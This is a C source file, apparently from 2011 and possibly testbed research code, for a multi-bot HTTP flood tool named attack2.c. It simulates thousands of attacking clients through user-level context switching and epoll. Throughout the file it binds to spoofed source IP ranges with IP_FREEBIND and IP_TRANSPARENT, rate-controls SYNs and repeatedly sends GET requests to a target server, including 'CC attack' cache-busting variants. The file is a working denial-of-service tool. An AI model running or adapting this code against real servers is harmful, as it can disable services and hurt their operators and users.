/* attack2.c
 * 2011. 4. 25
 * Seokshin Son
 *
 * To modify the behavior of each bot: modify tcp_attack()
 * In tcp_attack(), one must use wrapped socket API (e.g., ctx_read())
 * and also string (either cc_attack or req).
 *
 * To make no_read version, eliminate read() portion in tcp_attack()
 * 
 * */

#include <ucontext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>

#include <sys/types.h>
#include <wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>

#include <execinfo.h>

#define IP_FREEBIND		15 
#define IP_TRANSPARENT 		19

#define CLI_PORT		30000
#define CLI_DEV			"eth3"
#define CLI_BUF			512
#define SERV_ADDR		"18.0.0.1"
#define SERV_PORT		"80"

#define TIMER_INTERVAL		1

#define STACK_SIZE 		4 * 1024

#define die(msg) do { perror(msg); fprintf(stderr, "(%s:%d), %d:%s\n", __FUNCTION__, __LINE__, errno, strerror(errno)); exit(EXIT_FAILURE); } while (0)

#define DBG ;
//#define DBG do { printf("[%d]%s(%d), rc:%d, errno:%d(%s)\n", cur_thread, __FUNCTION__, __LINE__, rc, errno, error_string(errno)) ; } while (0)

//#define IDLE_TIME
//#define DEBUG

typedef unsigned long long __u64;

enum thread_state
{
    ST_READY = 1,
    ST_SOCK,
    ST_CONN,
    ST_READ,
    ST_WRITE,
    ST_BIND
};

typedef struct _ctx_thread
{
    int		index;
    ucontext_t	id;
    int		fd;
    int		errno_;
    char	ip_addr[16];
    short	port;
    int		status;
#ifdef IDLE_TIME
    __u64	idle_start;
    __u64	idle_end;
    __u64	idle_duration;
#endif

    __u64	conn_delay;
    __u64	sock_delay;
    __u64	read_delay;
    __u64	write_delay;
    __u64	bind_delay;
    int		packet_count;

    char	*stack;
} ctx_thread;

/* CPU clock speed: clocks per second */
__u64 cpu_clock;

/* policy variables */
// Syn Slot (ss)
int ss_max;
int ss_quota;
__u64 ss_start;

/* threads */
ctx_thread *thread;	// global thread structure
static ucontext_t uctx_main, scheduler;
static int cur_thread;
static int thread_num;	// # of all thread

/* epoll */
int g_epoll_fd;
struct epoll_event *g_events; 

/* statistics */
unsigned outcount;
int starttime;
struct timeval g_s_time;
struct timeval g_e_time;
int connections;
int max_conn;
int conn_rate;

/* attack target (server) addr */
struct sockaddr_in target;

/* attack requests: */
#ifdef ATTACK_NORMAL
static char *req = "GET / HTTP/1.1\r\nAccept: image/gif, image/jpeg, */*\r\n\r\n";
#endif

#ifdef ATTACK_CC
static char *req ="GET / HTTP/1.1\r\nConnection: Close\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)cache-control: no-store, must-revalidate\r\n\r\n";
#endif

#ifdef ATTACK_CC_HEADER
static char *req ="GET / HTTP/1.1\r\nConnection: Close\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\ncache-control: no-store, must-revalidate\r\n\r\n";
#endif

static char *dev = CLI_DEV;

/* ReaD TimeStamp Counter (RDTSC) */
inline __u64 read_clock()
{
    register __u64 TSC asm("eax");
    asm volatile (".byte 15, 49" : : : "eax", "edx");
    return TSC;
}

/* errno to string (for debugging) */
static char buffer[200];	// for error_string()
char *error_string(int num)
{
    char* temp = buffer;

    switch(num) {
	case 0:			// 0
	    strcpy(buffer, "normal exit(0)");
	    break;
	case EAGAIN:		// 11
	    strcpy(buffer, "Try again(EWOULDBLOCK, EAGAIN)");
	    break;
	case EINVAL:		// 22
	    strcpy(buffer, "Invalid argument(EINVAL)");
	    break;
	case EMFILE:
	    strcpy(buffer, "Too many open files(EMFILE)");
	    break;
	case EADDRNOTAVAIL:	// 99
	    strcpy(buffer, "Cannot assign requested address(EADDRNOTAVAIL)");
	    break;
	case EISCONN:		// 106
	    strcpy(buffer, "Transport endpoint is already connected(EISCONN)");
	    break;
	case ECONNREFUSED:	// 111
	    strcpy(buffer, "Connection refused(ECONNREFUSED)");
	    break;
	case EALREADY:		// 114
	    strcpy(buffer, "Operation already in progress(EALREADY)");
	    break;
	case EINPROGRESS:	// 115
	    strcpy(buffer, "Operation now in progress(EINPROGRESS)");
	    break;
	default:
	    strcpy(buffer, "I don't know");
    }

    return temp;
}

static void sche()
{

    /* scheduler main loop */
    while(1)
    {
#if 0 	
	/* manual scheduler */
	int input;
	printf("switch to: ");
	scanf("%d", &input);
	cur_thread = input;

	continue;
	errno = thread[cur_thread].errno_;
	gettimeofday(&e_time, NULL);
	thread[cur_thread].sche_delay += calc_time(s_time, e_time);

	if(swapcontext(&scheduler, &thread[cur_thread].id) != 0) {
	    die("swapcontext");
	}
#endif

#if 1 
	/* epoll scheduler */
	int nfds = epoll_wait(g_epoll_fd, g_events, thread_num + 1, 0); 

	if(nfds == 0) {
	    cur_thread++;
	    cur_thread %= thread_num;

	    // syn slot policy
	    if(ss_quota < 1 && thread[cur_thread].status == ST_CONN) {
		continue;
	    }

#ifdef IDLE_TIME
	    // idle time end
	    thread[cur_thread].idle_end = read_clock();
	    thread[cur_thread].idle_duration += 
		thread[cur_thread].idle_end - thread[cur_thread].idle_start;
	    thread[cur_thread].idle_duration /= 2;
#endif

	    if(swapcontext(&scheduler, &thread[cur_thread].id) != 0) {
		die("swapcontext");
	    }
	    continue;
	}
	else if(nfds < 0) {
	    die("epoll_wait");
	}

	int i;
	for(i = 0; i < nfds; i++) {
	    ctx_thread *temp = g_events[i].data.ptr;
	    cur_thread = temp->index;

	    // syn slot policy
	    if(ss_quota < 1 && thread[cur_thread].status == ST_CONN) {
		continue;
	    }
#ifdef IDLE_TIME	    
	    // idle time end
	    thread[cur_thread].idle_end = read_clock();
	    thread[cur_thread].idle_duration += 
		thread[cur_thread].idle_end - thread[cur_thread].idle_start;
	    thread[cur_thread].idle_duration /= 2;
#endif

	    if(swapcontext(&scheduler, &(temp->id)) != 0) {
		die("swapcontext");
	    }
	}
#endif
    }
}

// call by wrapping functions
static void schedule()
{
#ifdef IDLE_TIME
    // idle time start
    thread[cur_thread].idle_start = read_clock();
#endif

    if(swapcontext(&thread[cur_thread].id, &scheduler) != 0) {
	die("swapcontext");
    }
}

ssize_t ctx_read(int fd, void *buf, size_t count)
{
    ssize_t rc = -10;
    int first_call = 1;	// for time calculation
    __u64 s_time, e_time;

    while(1) {

	// timer start
	if(first_call) {
	    thread[cur_thread].status = ST_READ;
	    s_time = read_clock();
	    first_call = 0;
	}

	DBG;
	rc = read(fd, buf, count); thread[cur_thread].errno_ = errno;
	DBG;

	if(rc > -1) {
	    thread[cur_thread].errno_ = 0;

	    // timer end
	    e_time = read_clock();
	    thread[cur_thread].read_delay += e_time - s_time;
	    first_call = 1;

	    return rc;
	}
	schedule();
    }

    return rc;
}

ssize_t ctx_write(int fd, const void *buf, size_t count)
{
    ssize_t rc = -10;
    int first_call = 1;	// for time calculation
    __u64 s_time, e_time;

    while(1) {

	// timer start
	if(first_call) {
	    thread[cur_thread].status = ST_WRITE;
	    s_time = read_clock();
	    first_call = 0;
	}

	DBG;
	rc = write(fd, buf, count); thread[cur_thread].errno_ = errno;
	DBG;
	if(rc > -1) {
	    thread[cur_thread].errno_ = 0;

	    // timer end
	    e_time = read_clock();
	    thread[cur_thread].write_delay += e_time - s_time;
	    first_call = 1;

	    return rc;
	}
	schedule();
    }

    return rc;
}

int ctx_connect(int sockfd, const struct sockaddr *serv_addr, socklen_t addrlen)
{
    int rc = -10;
    int first_call = 1;	// for time calculation
    __u64 s_time, e_time;

    while(1) {
	// timer start
	if(first_call) {
	    thread[cur_thread].status = ST_CONN;
	    s_time = read_clock();
	    first_call = 0;
	    if(ss_quota < 1) schedule();
	    ss_quota--;
	}

	DBG;
	rc = connect(sockfd, serv_addr, addrlen); thread[cur_thread].errno_ = errno;
	DBG;
//	if(thread[cur_thread].errno_ == 0 || thread[cur_thread].errno_ == 106) {
	if(rc == 0 || thread[cur_thread].errno_ == 106) {
	    thread[cur_thread].errno_ = 0;

	    // timer end
	    e_time = read_clock();
	    thread[cur_thread].conn_delay += e_time - s_time;
	    first_call = 1;

	    connections++;
	    if(max_conn < connections) {
		max_conn = connections;
	    }
	    conn_rate++;

	    return 0;
	}
	schedule();
    }

    return rc;
}

int ctx_bind(int sockfd, const struct sockaddr *my_addr, socklen_t addrlen)
{
    int rc = -10;
    int first_call = 1;	// for time calculation
    __u64 s_time, e_time;

    while(1) {
	// timer start
	if(first_call) {
	    thread[cur_thread].status = ST_BIND;
	    s_time = read_clock();
	    first_call = 0;
	}

	DBG;
	rc = bind(sockfd, my_addr, addrlen); thread[cur_thread].errno_ = errno;
	DBG;

	if(rc == 0) {
	    thread[cur_thread].errno_ = 0;

	    // timer end
	    e_time = read_clock();
	    thread[cur_thread].bind_delay += e_time - s_time;
	    first_call = 1;

	    return rc;
	}
	schedule();
    }

    return rc;
}

int ctx_socket(int domain, int type, int protocol)
{
    int rc = -1;
    struct epoll_event events;
    int first_call = 1;	// for time calculation
    __u64 s_time, e_time;

    while(1) {
	// timer start
	if(first_call) {
	    thread[cur_thread].status = ST_SOCK;
	    s_time = read_clock();
	    first_call = 0;
	}

	DBG;
	rc = socket(domain, type, protocol);
	DBG;

	if(rc > -1) {
	    thread[cur_thread].errno_ = 0;

	    // timer end
	    e_time = read_clock();
	    thread[cur_thread].sock_delay += e_time - s_time;
	    first_call = 1;

	    events.events = EPOLLIN | EPOLLET;
	    events.data.ptr = &thread[cur_thread]; 
	    if(epoll_ctl(g_epoll_fd, EPOLL_CTL_ADD, rc, &events) < 0) {
		die("epoll_ctl");
	    }

	    thread[cur_thread].fd = rc;

	    return rc;
	}
	schedule();
    }

    return rc;
}

int ctx_close(int fd)
{
    int rc = 0;
    struct epoll_event events;

    events.events = EPOLLIN;
    if(epoll_ctl(g_epoll_fd, EPOLL_CTL_DEL, fd, NULL) < 0) {
	die("epoll_ctl");
    }
    DBG;
    rc = close(fd);
    DBG;
    if(rc != 0)
	printf("thread: %d, rc of close: %d, errno: %d(%s)\n", cur_thread, rc, errno, error_string(errno));

    connections--;

    return rc;
}

/* called by SIGINT signal */
void stat(int signum) {
    int i;
    __u64 sock_delay = 0;
    __u64 conn_delay = 0;
    __u64 read_delay = 0;
    __u64 write_delay = 0;
    __u64 bind_delay = 0;

    int status[7] = {0, };
    __u64 packet_sent[10] = {0, };

    /* in some cases, SIGPIPE is occured but i don't know whether i have to process it or not */
    if(signum == SIGPIPE)
	printf("### caught by SIGPIPE\n");

    gettimeofday(&g_e_time, NULL);

    /* delay, packet sent, finish status of each thread */
    for(i = 0; i < thread_num; i++) {
	/* delay total */
	sock_delay += thread[i].sock_delay;
	conn_delay += thread[i].conn_delay;
	read_delay += thread[i].read_delay;
	write_delay += thread[i].write_delay;
	bind_delay += thread[i].bind_delay;

	/* packet sent */
	int pkts = thread[i].packet_count;
	if(pkts == 0) packet_sent[0]++;
	else if(pkts > 0 && pkts < 10) packet_sent[1]++;
	else if(pkts >= 10 && pkts < 100) packet_sent[2]++;
	else if(pkts >= 100 && pkts < 1000) packet_sent[3]++;
	else if(pkts >= 1000 && pkts < 10000) packet_sent[4]++;

	/* status total */
	status[thread[i].status]++;
    }

    int ctime=time(NULL);
    printf(" ---- overall statistics ------------------------------------------------\n");
    printf("   packets sent:          %d\n",outcount);
    printf("   bytes sent:            %d\n",outcount * strlen(req));
    printf("   seconds active:        %d\n",ctime-starttime);
    printf("   average bytes/second:  %d\n",(outcount * strlen(req)/(ctime-starttime)));
    printf("   average packets/second:%d\n",outcount/(ctime-starttime));
    printf("\n");

    printf(" ---- total delay summation (us) ----------------------------------------\n");
    printf("   ready_delay:           %20s, %d threads\n", "N/A", status[ST_READY]);
    printf("   sock_delay:            %20llu, %d threads\n", sock_delay, status[ST_SOCK]);
    printf("   bind_delay:            %20llu, %d threads\n", bind_delay, status[ST_BIND]); 
    printf("   conn_delay:            %20llu, %d threads\n", conn_delay, status[ST_CONN]); 
    printf("   read_delay:            %20llu, %d threads\n", read_delay, status[ST_READ]); 
    printf("   write_delay:           %20llu, %d threads\n", write_delay, status[ST_WRITE]); 
    printf("\n");

    printf(" ---- packet sent (#) ------+----------+----------+----------+----------+\n");
    printf("                 |     0    |  1 - 10  |  10-100  | 100-1000 |  10000 < |\n");
    printf(" ----------------+----------+----------+----------+----------+----------|\n");
    printf("   # of host     |   %-6llu |   %-6llu |   %-6llu |   %-6llu |   %-6llu |\n", 
	    packet_sent[0], packet_sent[1], packet_sent[2], packet_sent[3], packet_sent[4]);
    printf(" ----------------+----------+----------+----------+----------+----------+\n");
    printf("\n");
    
    /* close all client sockets */
    signal(SIGINT, SIG_DFL);
    signal(SIGALRM, SIG_DFL);
    alarm(0);
    
    int rc;
    for(i = 0; i < thread_num; i++) {
	if(thread[i].status != ST_SOCK)
	    rc = ctx_close(thread[i].fd);
	if(rc != 0) printf("fd: %d, rc:%d, errno:%d(%s)\n", thread[i].fd, rc, errno, error_string(errno));
    }

    exit(EXIT_SUCCESS);	// print stat and exit
}

/* attacker function */
static void tcp_attack()
{
    char rcv[CLI_BUF] = {0, };
    int fd;

    while(1) {
	/* initialize socket */
	if((fd = ctx_socket(PF_INET, SOCK_STREAM, 0)) < 0) {
	    die("cts_socket");
	}

	// set to nonblock socket mode
	if(fcntl(fd, F_SETFL, O_NONBLOCK) < 0) {
	    die("fcntl");
	}

	int on = 1;
	
	if(setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) < 0) {
	    die("setsockopt reuse error");
	}

	if(setsockopt(fd, SOL_IP, IP_FREEBIND, &on, sizeof(on)) < 0) {
	    die("setsockopt freebind error");
	}

	if(setsockopt(fd, SOL_IP, IP_TRANSPARENT, &on, sizeof(on)) < 0) {
	    die("setsockopt transparent error");
	}

	if(setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, dev, strlen(dev)) < 0) {
	    die("setsockopt bindtodevice error");
	}

	/* bind */
	struct sockaddr_in cli_addr;
	memset(&cli_addr, 0, sizeof(cli_addr));
	cli_addr.sin_family = AF_INET;
	cli_addr.sin_addr.s_addr = inet_addr(thread[cur_thread].ip_addr);
	cli_addr.sin_port = htons(thread[cur_thread].port);

	if(ctx_bind(fd, (struct sockaddr *)&cli_addr, sizeof(cli_addr)) < 0) {
	    die("cannot bind");
	}

	/* connect to the server */
	if(ctx_connect(fd, (struct sockaddr *)&target, sizeof(target)) < 0) {
	    die("cannot connect");
	}

	/* write */
	if(ctx_write(fd, req, strlen(req)) < 0) {
	    die("write error");// ERROR
	}
	
	/* read */
	if(ctx_read(fd, rcv, sizeof(rcv)) < 0) {
	    die("read error");
	}

	/* statistics: success */
	outcount++;
	thread[cur_thread].packet_count++;
	
	/* dealloc resources */
	ctx_close(fd);
	schedule();
    }
}

void init(int ip_num, int port_num)
{
    int i;
    thread = malloc(ip_num * port_num * sizeof(ctx_thread));
    if(!thread) die("malloc");

    /* init scheduler */
    char *scheduler_stack = malloc(STACK_SIZE);
    if(getcontext(&scheduler) == -1)
	die("getcontext");
    scheduler.uc_stack.ss_sp = scheduler_stack;
    scheduler.uc_stack.ss_size = STACK_SIZE;
    scheduler.uc_link = &uctx_main;
    makecontext(&scheduler, sche, 0);

    /* init ucontext */ 
    for (i=0; i < ip_num * port_num; i++) {
	thread[i].stack = malloc(STACK_SIZE);
	if(!thread[i].stack) die("stack_malloc");

	if (getcontext(&thread[i].id) == -1) {
	    die("getcontext");
	}
	thread[i].id.uc_stack.ss_sp = thread[i].stack;
	thread[i].id.uc_stack.ss_size = STACK_SIZE;
	thread[i].id.uc_link = &uctx_main;
	makecontext(&thread[i].id, tcp_attack, 0);
    }

    /* init epoll */
    int epoll_size = thread_num;
    g_events = malloc(epoll_size  * sizeof(struct epoll_event));
    if(!g_events) {
	    die("malloc(g_event)");
    } 

    if((g_epoll_fd = epoll_create(epoll_size)) < 0) {
	die("epoll_create failes. please check your kernel&library support epoll.");
    }
    //printf("[ETEST][START] epoll creation success\n");

    /* set max open file descriptor */
    struct rlimit limit;

    getrlimit(RLIMIT_NOFILE, &limit);
    printf("modifying open fd capability from (cur=%lu max=%lu) to 1000000\n", limit.rlim_cur, limit.rlim_max);

    limit.rlim_cur = 1000000;
    limit.rlim_max = 1000000;
    setrlimit(RLIMIT_NOFILE, &limit);

    /* init statistics */
    for(i = 0; i < thread_num; i++){
	// indexing for epoll_wait
	thread[i].index = i;

	// global delay variable
	thread[i].conn_delay = 0;
	thread[i].read_delay = 0;
	thread[i].write_delay = 0;
	thread[i].bind_delay= 0 ;

	thread[i].status = ST_READY;
#ifdef IDLE_TIME
	thread[i].idle_start = read_clock();
	thread[i].idle_end = read_clock();
	thread[i].idle_duration = 0;
#endif
    }

    /* set policies */
    ss_start = read_clock();
}

void feed_quota(int signum)
{
    // feed syn quota
//    printf("remaining quota: %d\n", ss_quota);
    ss_quota = ss_max;
    alarm(TIMER_INTERVAL);

    printf("connections: %d, (max: %d), (rate: %d)\n", connections, max_conn, conn_rate);
    conn_rate = 0;
}

#ifdef DEBUG
void back_trace()
{
    die("in back_trace");
}

/* addr2line -e [executable] [hex address] */
static void sighandler(int num)
{
    void *array[20];	// only care about last 17 functions (3 taken with tracing support)
    size_t size;
    char **strings;
    size_t i;

    size = backtrace(array, 20);
    strings = backtrace_symbols(array, size);	// need -rdynamic gcc (linker) flag for this to work

    for(i = 0; i < size; i++) {
	printf("%s\n", strings[i]);	// ERROR
    }

    free(strings);

    signal(SIGABRT, SIG_DFL);
    abort();	// hopefully will give core
}
#endif

int main(int argc, char *argv[])
{
    if(argc != 8) {
	printf("usage: %s srv_ip srv_port start_ip #ip #port syn/s dev\n", argv[0]);
	printf("example: %s 18.0.0.1 80 9.1.1.1 100 10 100 eth0\n", argv[0]);
	exit(EXIT_SUCCESS);
    }

    dev = argv[7];

    /* CPU clock test (Hz) */
    __u64 test = read_clock();
    sleep(1);
    cpu_clock = read_clock() - test;
    printf("CPU: %llu MHz\n", cpu_clock / (1000 * 1000));

    // get start time 
    gettimeofday(&g_s_time, NULL);

    struct in_addr addr;

    if(inet_aton(argv[3], &addr) == 0) {
	printf("invalid address: %s\n", argv[3]);
	exit(EXIT_FAILURE);
    }

    /* policy: syn flooding */
    ss_max = atoi(argv[6]);
    ss_quota = ss_max;

    int i, index = 0;
    short j;
    int ip_num = atoi(argv[4]);
    int port_num = atoi(argv[5]);
    thread_num = ip_num * port_num;
    
    /* initialization */
    init(ip_num, port_num);
    starttime = time(NULL);
    printf("total connections: %d\n", ip_num * port_num);

    addr.s_addr = htonl(ntohl(addr.s_addr));
    for(i = 0; i < ip_num; i++) {
	for(j = 0; j < port_num; j++) {
	    strcpy(thread[index].ip_addr, inet_ntoa(addr));
	    thread[index++].port = (short)CLI_PORT + j;
	}
	addr.s_addr = htonl(ntohl(addr.s_addr) + 1);
    }

#ifdef DEBUG
    /* error processing */
    if(atexit(back_trace) != 0) {
	die("atexit");
    }
    signal(SIGSEGV, sighandler);
    signal(SIGPIPE, sighandler);	// for "broken pipe" msg
#endif

    /* for printing statistics */
    signal(SIGINT, stat);

    /* quota feeder signal */
    signal(SIGALRM, feed_quota);
    alarm(TIMER_INTERVAL);

    /* make server address */
    struct sockaddr_in srv_addr;
    //char *srv_ip = SERV_ADDR;
    //char *srv_port = SERV_PORT;
    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = inet_addr(argv[1]);
    srv_addr.sin_port = htons(atoi(argv[2]));

    target = srv_addr;	// save to global variable
    
    /* call scheduler */
    swapcontext(&uctx_main, &scheduler);

    /* never reached */
    printf("program ends(never reached)\n");
    return 1;
}
